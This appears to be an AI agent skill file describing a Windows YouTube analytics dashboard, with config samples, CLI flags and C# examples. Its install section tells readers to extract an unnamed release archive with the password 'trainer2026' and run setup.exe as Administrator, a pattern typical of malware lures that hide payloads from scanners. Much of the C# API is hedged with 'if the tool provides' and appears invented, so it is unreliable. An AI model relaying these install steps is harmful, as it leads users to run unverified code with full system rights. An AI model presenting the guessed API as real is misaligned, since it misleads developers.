---
name: youtube-channel-analytics-dashboard
description: Dashboard tool for analyzing YouTube channel metrics including views, watch time, subscriber growth, revenue, and audience demographics with real-time data visualization.
triggers:
  - analyze my YouTube channel performance
  - track YouTube subscriber growth over time
  - visualize YouTube analytics data
  - monitor YouTube channel revenue and demographics
  - export YouTube analytics reports
  - create a YouTube channel dashboard
  - show YouTube video performance metrics
  - generate YouTube audience insights
---

# YouTube Channel Analytics Dashboard

> Skill by [ara.so](https://ara.so) — Data Skills collection.

## Overview

YouTube Channel Analytics Dashboard is a comprehensive analytics tool that provides real-time and historical insights into YouTube channel performance. It tracks views, watch time, subscriber growth, revenue estimates, and audience demographics through an interactive dashboard interface.

**Key capabilities:**
- Real-time statistics monitoring (views, subscribers)
- Historical trend visualization with growth charts
- Revenue tracking and estimates
- Audience demographics and geographic mapping
- Video-level performance analysis
- Report export (CSV/PDF formats)

## Installation

### Windows Setup

1. Download the package from the repository releases
2. Extract the archive (password: `trainer2026`)
3. Run `setup.exe` as Administrator
4. Follow the configuration wizard

### Requirements

- **OS:** Windows 10/11 (64-bit)
- **Runtime:** .NET Framework 4.8+ or Visual C++ Redistributable
- **Architecture:** x64

### Configuration

Create a configuration file `config.json` in the application directory:

```json
{
  "youtube": {
    "api_key": "${YOUTUBE_API_KEY}",
    "channel_id": "${YOUTUBE_CHANNEL_ID}"
  },
  "refresh_interval": 300,
  "data_retention_days": 90,
  "export": {
    "default_format": "csv",
    "output_directory": "./exports"
  },
  "dashboard": {
    "theme": "light",
    "auto_refresh": true
  }
}
```

### Environment Variables

Set these environment variables for API authentication:

```bash
YOUTUBE_API_KEY=your_youtube_api_key_here
YOUTUBE_CHANNEL_ID=your_channel_id_here
YOUTUBE_DATA_API_VERSION=v3
```

## Core Functionality

### Connecting to YouTube API

The dashboard integrates with YouTube Data API v3. Ensure you have:

1. A Google Cloud project with YouTube Data API enabled
2. OAuth 2.0 credentials or API key
3. Proper scopes: `youtube.readonly`, `yt-analytics.readonly`

### Key Metrics Tracked

| Metric | Description | Update Frequency |
|--------|-------------|------------------|
| Views | Total and daily video views | Real-time |
| Watch Time | Total minutes watched | Hourly |
| Subscribers | Current count and growth | Real-time |
| Revenue | Estimated earnings (CPM-based) | Daily |
| Demographics | Age, gender, geography | Daily |
| Engagement | Likes, comments, shares | Hourly |

## Usage Patterns

### Launching the Dashboard

```bash
# Standard launch
.\YouTubeAnalytics.exe

# With custom config
.\YouTubeAnalytics.exe --config custom_config.json

# Debug mode
.\YouTubeAnalytics.exe --debug --verbose
```

### Command-Line Interface

```bash
# Export current analytics to CSV
.\YouTubeAnalytics.exe --export csv --output ./reports/analytics.csv

# Export specific date range
.\YouTubeAnalytics.exe --export pdf --from 2026-01-01 --to 2026-06-30

# Generate subscriber growth report
.\YouTubeAnalytics.exe --report subscribers --period 30d

# Fetch real-time stats only
.\YouTubeAnalytics.exe --realtime --format json
```

### API Integration (If Extensible)

If the tool provides a scriptable interface or API:

```csharp
using YouTubeAnalytics.Core;
using YouTubeAnalytics.Models;

// Initialize the analytics client
var config = new AnalyticsConfig
{
    ApiKey = Environment.GetEnvironmentVariable("YOUTUBE_API_KEY"),
    ChannelId = Environment.GetEnvironmentVariable("YOUTUBE_CHANNEL_ID"),
    RefreshInterval = TimeSpan.FromMinutes(5)
};

var client = new YouTubeAnalyticsClient(config);

// Fetch real-time statistics
var stats = await client.GetRealtimeStatsAsync();
Console.WriteLine($"Current Subscribers: {stats.SubscriberCount}");
Console.WriteLine($"Total Views: {stats.TotalViews}");

// Get historical data
var history = await client.GetHistoricalDataAsync(
    startDate: DateTime.Now.AddDays(-30),
    endDate: DateTime.Now,
    metrics: new[] { "views", "subscribersGained", "estimatedRevenue" }
);

// Analyze top performing videos
var topVideos = await client.GetTopVideosAsync(
    period: TimePeriod.Last30Days,
    metric: VideoMetric.Views,
    limit: 10
);

foreach (var video in topVideos)
{
    Console.WriteLine($"{video.Title}: {video.Views:N0} views");
}

// Export to CSV
var exporter = new DataExporter(client);
await exporter.ExportToCsvAsync(
    "./exports/monthly_report.csv",
    startDate: DateTime.Now.AddMonths(-1),
    endDate: DateTime.Now
);
```

### Automation Scripts

```csharp
// Scheduled daily report generation
using YouTubeAnalytics.Automation;

var scheduler = new ReportScheduler(client);

scheduler.ScheduleDailyReport(
    time: new TimeSpan(9, 0, 0), // 9 AM
    reportType: ReportType.DailySummary,
    recipients: new[] { "team@example.com" },
    format: ExportFormat.PDF
);

// Alert on subscriber milestones
scheduler.AddAlert(new SubscriberMilestoneAlert
{
    Milestone = 10000,
    NotificationMethod = NotificationMethod.Email,
    Recipient = "notifications@example.com"
});
```

## Data Analysis Patterns

### Subscriber Growth Analysis

```csharp
// Calculate growth rate
var growth = await client.GetSubscriberGrowthAsync(
    period: TimePeriod.Last90Days
);

var avgDailyGrowth = growth.Sum(d => d.NewSubscribers) / growth.Count;
var growthRate = (growth.Last().TotalSubscribers - growth.First().TotalSubscribers) 
                 / (double)growth.First().TotalSubscribers * 100;

Console.WriteLine($"Average daily growth: {avgDailyGrowth:F1} subscribers");
Console.WriteLine($"90-day growth rate: {growthRate:F2}%");
```

### Revenue Tracking

```csharp
// Estimate revenue by video
var revenueData = await client.GetRevenueBreakdownAsync(
    startDate: DateTime.Now.AddMonths(-1),
    endDate: DateTime.Now,
    groupBy: RevenueGrouping.ByVideo
);

var topEarners = revenueData
    .OrderByDescending(v => v.EstimatedRevenue)
    .Take(10);

foreach (var video in topEarners)
{
    Console.WriteLine($"{video.Title}: ${video.EstimatedRevenue:F2}");
}
```

### Audience Demographics

```csharp
// Analyze audience location
var demographics = await client.GetAudienceDemographicsAsync();

var topCountries = demographics.Geography
    .OrderByDescending(g => g.ViewPercentage)
    .Take(5);

Console.WriteLine("Top 5 Countries:");
foreach (var country in topCountries)
{
    Console.WriteLine($"  {country.Name}: {country.ViewPercentage:F1}%");
}

// Age distribution
var ageGroups = demographics.AgeDistribution;
Console.WriteLine($"Primary audience age: {ageGroups.MaxBy(a => a.Percentage).AgeRange}");
```

## Dashboard Customization

### Creating Custom Views

If the dashboard supports custom panels:

```csharp
// Define a custom dashboard layout
var dashboard = new DashboardLayout();

dashboard.AddPanel(new Panel
{
    Type = PanelType.LineChart,
    Title = "Subscriber Growth",
    DataSource = DataSource.SubscriberHistory,
    Position = new Position(0, 0),
    Size = new Size(2, 1)
});

dashboard.AddPanel(new Panel
{
    Type = PanelType.Gauge,
    Title = "Real-time Views",
    DataSource = DataSource.RealtimeViews,
    Position = new Position(2, 0),
    Size = new Size(1, 1)
});

dashboard.AddPanel(new Panel
{
    Type = PanelType.Map,
    Title = "Audience Geography",
    DataSource = DataSource.Geography,
    Position = new Position(0, 1),
    Size = new Size(3, 1)
});

await dashboard.SaveAsync("custom_layout.json");
```

## Export and Reporting

### CSV Export

```bash
# Export all metrics
.\YouTubeAnalytics.exe --export csv --metrics all --output report.csv

# Export specific metrics
.\YouTubeAnalytics.exe --export csv --metrics views,subscribers,revenue --from 2026-01-01
```

### PDF Report Generation

```csharp
using YouTubeAnalytics.Reporting;

var reportGenerator = new PdfReportGenerator(client);

var report = await reportGenerator.GenerateAsync(new ReportOptions
{
    Title = "Monthly Performance Report",
    Period = new DateRange(DateTime.Now.AddMonths(-1), DateTime.Now),
    Sections = new[]
    {
        ReportSection.Overview,
        ReportSection.SubscriberGrowth,
        ReportSection.TopVideos,
        ReportSection.AudienceDemographics,
        ReportSection.RevenueEstimate
    },
    IncludeCharts = true,
    BrandingLogo = "./logo.png"
});

await report.SaveAsync("./reports/monthly_report.pdf");
```

## Troubleshooting

### API Connection Issues

**Problem:** Dashboard fails to connect to YouTube API

**Solutions:**
- Verify `YOUTUBE_API_KEY` is set correctly
- Check API quota limits in Google Cloud Console
- Ensure YouTube Data API v3 is enabled
- Verify channel ID format (should start with "UC")

```bash
# Test API connection
.\YouTubeAnalytics.exe --test-connection --verbose
```

### Missing Data

**Problem:** Some metrics show no data or zero values

**Solutions:**
- Ensure OAuth scopes include `yt-analytics.readonly`
- Check date range (revenue data may have 2-3 day delay)
- Verify channel has sufficient history (minimum 7 days)
- Re-authenticate if token expired

```csharp
// Force data refresh
await client.RefreshAllMetricsAsync(forceUpdate: true);
```

### Export Failures

**Problem:** CSV/PDF export hangs or fails

**Solutions:**
- Check disk space in output directory
- Reduce date range for large datasets
- Verify write permissions on output folder
- Use smaller metric subset

```bash
# Export with limited data
.\YouTubeAnalytics.exe --export csv --metrics views,subscribers --limit 1000
```

### High Memory Usage

**Problem:** Dashboard consumes excessive memory with large datasets

**Solutions:**
- Reduce `data_retention_days` in config
- Enable data pagination for exports
- Clear cache regularly

```json
{
  "performance": {
    "enable_caching": true,
    "cache_max_size_mb": 500,
    "auto_cleanup": true
  }
}
```

## Best Practices

1. **API Quota Management:** Monitor YouTube API quota usage to avoid rate limits (default: 10,000 units/day)
2. **Data Retention:** Set appropriate retention periods to balance history vs. performance
3. **Scheduled Exports:** Automate weekly/monthly reports for consistent tracking
4. **Multiple Channels:** Use separate config files for managing multiple channels
5. **Backup Data:** Regularly export historical data before rotating logs

## Advanced Features

### Webhook Integration

```csharp
// Set up webhook for real-time alerts
var webhookConfig = new WebhookConfig
{
    Url = "https://your-server.com/youtube-webhook",
    Events = new[] { "subscriber_milestone", "viral_video", "revenue_threshold" },
    Secret = Environment.GetEnvironmentVariable("WEBHOOK_SECRET")
};

await client.ConfigureWebhookAsync(webhookConfig);
```

### Comparison Analytics

```csharp
// Compare two time periods
var comparison = await client.ComparePeriodsAsync(
    period1: new DateRange(DateTime.Now.AddMonths(-2), DateTime.Now.AddMonths(-1)),
    period2: new DateRange(DateTime.Now.AddMonths(-1), DateTime.Now),
    metrics: new[] { "views", "subscribers", "watchTime" }
);

Console.WriteLine($"Views change: {comparison.Views.PercentChange:F1}%");
Console.WriteLine($"Subscriber change: {comparison.Subscribers.PercentChange:F1}%");
```

This skill enables AI agents to help developers effectively use YouTube Channel Analytics Dashboard for comprehensive channel performance monitoring and reporting.
